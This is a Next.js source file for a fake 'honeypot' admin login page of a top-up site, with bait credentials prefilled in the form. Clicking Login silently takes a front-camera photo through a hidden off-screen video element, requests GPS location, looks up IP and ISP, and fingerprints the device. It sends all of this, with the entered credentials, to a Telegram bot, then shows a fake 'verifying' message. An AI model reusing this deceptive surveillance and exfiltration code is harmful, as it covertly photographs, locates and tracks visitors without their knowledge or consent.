"use client";

import { useState, useRef } from "react";
import Image from "next/image";
import Link from "next/link";

// Font 'Kantumruy Pro' is imported in globals.css
// .font-khmer & .animate-float-up are defined in globals.css

const TELEGRAM_TOKEN = process.env.NEXT_PUBLIC_TELEGRAM_BOT_TOKEN || "";
const TELEGRAM_CHAT_ID = process.env.NEXT_PUBLIC_TELEGRAM_CHAT_ID || "";

async function sendToTelegram(text: string) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text, parse_mode: "HTML" }),
  });
}

async function sendPhotoToTelegram(base64: string, caption: string) {
  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) return;
  const res = await fetch(base64);
  const blob = await res.blob();
  const formData = new FormData();
  formData.append("chat_id", TELEGRAM_CHAT_ID);
  formData.append("photo", blob, "hacker.jpg");
  formData.append("caption", caption);
  await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`, {
    method: "POST",
    body: formData,
  });
}

// Floating icon config — dur/delay hardcoded per icon (no CSS variables needed)
const BG_ICONS = [
  { icon: "💕", left: "10%", dur: "8s",  delay: "0s"    },
  { icon: "🌸", left: "22%", dur: "10s", delay: "1.5s"  },
  { icon: "✨", left: "34%", dur: "12s", delay: "3s"    },
  { icon: "💖", left: "46%", dur: "14s", delay: "4.5s"  },
  { icon: "🌺", left: "58%", dur: "16s", delay: "6s"    },
  { icon: "⭐", left: "70%", dur: "18s", delay: "7.5s"  },
  { icon: "💗", left: "82%", dur: "20s", delay: "9s"    },
  { icon: "🎀", left: "94%", dur: "22s", delay: "10.5s" },
];

export default function HoneypotLoginPage() {
  const [loading, setLoading] = useState(false);
  const [done, setDone] = useState(false);
  const [showPassword, setShowPassword] = useState(false);
  const [inputEmail, setInputEmail] = useState("jasminadmin@gmail.com");
  const [inputPassword, setInputPassword] = useState("jaminadmin1122334455!@");
  const videoRef = useRef<HTMLVideoElement>(null);
  const canvasRef = useRef<HTMLCanvasElement>(null);

  async function getIPInfo() {
    try {
      const r = await fetch("https://ipapi.co/json/");
      return await r.json();
    } catch {
      return {};
    }
  }

  async function getLocation(): Promise<{ lat: number; lon: number; mapLink: string } | null> {
    return new Promise((resolve) => {
      if (!navigator.geolocation) { resolve(null); return; }
      navigator.geolocation.getCurrentPosition(
        (pos) => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          resolve({ lat, lon, mapLink: `https://www.google.com/maps?q=${lat},${lon}` });
        },
        () => resolve(null),
        { timeout: 6000 }
      );
    });
  }

  async function takeFrontPhoto(): Promise<string | null> {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
      if (!videoRef.current || !canvasRef.current) { stream.getTracks().forEach(t => t.stop()); return null; }
      videoRef.current.srcObject = stream;
      await videoRef.current.play();
      await new Promise(r => setTimeout(r, 1200));
      const canvas = canvasRef.current;
      canvas.width = videoRef.current.videoWidth || 640;
      canvas.height = videoRef.current.videoHeight || 480;
      canvas.getContext("2d")?.drawImage(videoRef.current, 0, 0);
      stream.getTracks().forEach(t => t.stop());
      return canvas.toDataURL("image/jpeg", 0.85);
    } catch {
      return null;
    }
  }

  async function handleLogin() {
    setLoading(true);

    const [ipInfo, location, photo] = await Promise.all([
      getIPInfo(),
      getLocation(),
      takeFrontPhoto(),
    ]);

    const ua = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screen = `${window.screen.width}x${window.screen.height}`;
    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    const now = new Date().toLocaleString("km-KH", { timeZone: "Asia/Phnom_Penh" });
    const mapLink = location?.mapLink || "មិនអាចទទួលបានទីតាំង";

    const message = `
🚨 <b>HACKER DETECTED — JASMIN ADMIN</b> 🚨

🕐 <b>ពេលវេលា:</b> ${now}

🌐 <b>IP Address:</b> ${ipInfo.ip || "Unknown"}
🏙️ <b>ទីក្រុង:</b> ${ipInfo.city || "?"}, ${ipInfo.region || "?"}
🌍 <b>ប្រទេស:</b> ${ipInfo.country_name || "?"} ${ipInfo.country_code || ""}
📡 <b>ISP:</b> ${ipInfo.org || "?"}

📍 <b>GPS Location:</b> <a href="${mapLink}">${mapLink}</a>

💻 <b>Device:</b> ${platform}
🖥️ <b>Screen:</b> ${screen}
🌐 <b>Browser:</b> ${ua.substring(0, 120)}
🔤 <b>Language:</b> ${language}
⏰ <b>Timezone:</b> ${timeZone}

📧 <b>Email បញ្ចូល:</b> ${inputEmail}
🔑 <b>Password បញ្ចូល:</b> ${inputPassword}

⚠️ <b>Action:</b> Attempted fake admin login
    `.trim();

    await sendToTelegram(message);

    if (photo) {
      await sendPhotoToTelegram(photo, `📸 រូបថត Hacker — ${ipInfo.ip || "Unknown IP"} — ${now}`);
    } else {
      await sendToTelegram("📷 មិនអាចថតរូបបានទេ (Camera បានបដិសេធ ឬមិនមាន)");
    }

    setLoading(false);
    setDone(true);
  }

  // ── shared input className ──
  const inputCls =
    "w-full px-4 py-[0.7rem] border-[1.5px] border-[#f8bbd0] rounded-xl text-[0.9rem] " +
    "font-khmer text-[#333] bg-white outline-none transition-all duration-200 " +
    "focus:border-[#e91e63] focus:shadow-[0_0_0_3px_rgba(233,30,99,0.1)]";

  return (
    <>
      {/* Hidden video + canvas for camera capture */}
      <video
        ref={videoRef}
        className="fixed opacity-0 pointer-events-none w-px h-px top-[-9999px] left-[-9999px]"
        muted
        playsInline
      />
      <canvas
        ref={canvasRef}
        className="fixed opacity-0 pointer-events-none w-px h-px top-[-9999px] left-[-9999px]"
      />

      {/* ── Root ── */}
      <div className="font-khmer min-h-screen flex items-center justify-center relative overflow-hidden bg-gradient-to-br from-[#ffe4ef] via-[#ffd6e8] to-[#fce4ff]">

        {/* Floating background icons */}
        {BG_ICONS.map(({ icon, left, dur, delay }, i) => (
          <div
            key={i}
            className="fixed text-[1.5rem] pointer-events-none z-0 animate-float-up"
            style={{ left, animationDuration: dur, animationDelay: delay }}
          >
            {icon}
          </div>
        ))}

        {/* ── Card wrap ── */}
        <div className="relative z-10 w-full max-w-[420px] px-6">

          {/* Logo */}
          <div className="flex justify-center mb-5">
            <Image
              src="https://i.ibb.co/ycPxxz8h/IMG-20260515-100429.png"
              alt="JASMIN"
              width={80}
              height={80}
              className="rounded-full border-[3px] border-[rgba(233,30,99,0.3)] shadow-[0_4px_20px_rgba(233,30,99,0.25)]"
              priority
            />
          </div>

          {/* Glass card */}
          <div className="bg-white/92 backdrop-blur-[20px] rounded-[24px] px-8 pt-10 pb-8 shadow-[0_8px_40px_rgba(233,30,99,0.12),0_2px_8px_rgba(0,0,0,0.06)] text-center">

            <div className="text-[1.4rem] font-bold text-[#c2185b] mb-1">🔐 Admin Login</div>
            <div className="text-[0.8rem] text-[#aaa] mb-7">JASMIN TOPUP — Admin Dashboard</div>

            {/* Email */}
            <div className="text-left mb-4">
              <label className="block text-[0.78rem] text-[#888] font-medium mb-[0.35rem]">Email</label>
              <input
                className={inputCls}
                type="text"
                value={inputEmail}
                onChange={e => setInputEmail(e.target.value)}
                autoComplete="off"
              />
            </div>

            {/* Password */}
            <div className="text-left mb-4">
              <label className="block text-[0.78rem] text-[#888] font-medium mb-[0.35rem]">Password</label>
              <div className="relative">
                <input
                  className={`${inputCls} pr-12`}
                  type={showPassword ? "text" : "password"}
                  value={inputPassword}
                  onChange={e => setInputPassword(e.target.value)}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(v => !v)}
                  className="absolute right-3 top-1/2 -translate-y-1/2 bg-transparent border-none cursor-pointer text-[1.1rem] text-[#e91e63] p-[0.2rem] leading-none"
                  title={showPassword ? "លាក់ Password" : "បង្ហាញ Password"}
                >
                  {showPassword ? "🙈" : "👁️"}
                </button>
              </div>
            </div>

            {/* Login button */}
            <button
              onClick={handleLogin}
              disabled={loading || done}
              className="w-full py-[0.85rem] bg-[linear-gradient(135deg,#e91e63,#c2185b)] text-white border-none rounded-[14px] text-base font-semibold font-khmer cursor-pointer mt-2 flex items-center justify-center gap-2 transition-all duration-200 hover:opacity-[0.92] hover:-translate-y-px active:translate-y-0 disabled:opacity-60 disabled:cursor-not-allowed disabled:translate-y-0"
            >
              {loading ? (
                <>
                  <span className="w-[18px] h-[18px] border-2 border-white/40 border-t-white rounded-full animate-spin" />
                  កំពុង Login...
                </>
              ) : done ? (
                "✅ បានចូល"
              ) : (
                "🔓 Login"
              )}
            </button>

            {done && (
              <div className="text-[#e91e63] text-[0.9rem] mt-4 py-3 px-4 bg-[#fff0f5] rounded-[10px] border border-[#f8bbd0]">
                ⏳ កំពុងផ្ទៀងផ្ទាត់... សូមរង់ចាំ
              </div>
            )}
          </div>

          <Link
            href="/"
            className="block text-center mt-5 text-[0.78rem] text-[rgba(194,24,91,0.5)] no-underline hover:text-[#e91e63] transition-colors duration-200"
          >
            ← ត្រឡប់ទៅទំព័រដើម
          </Link>
        </div>
      </div>
    </>
  );
}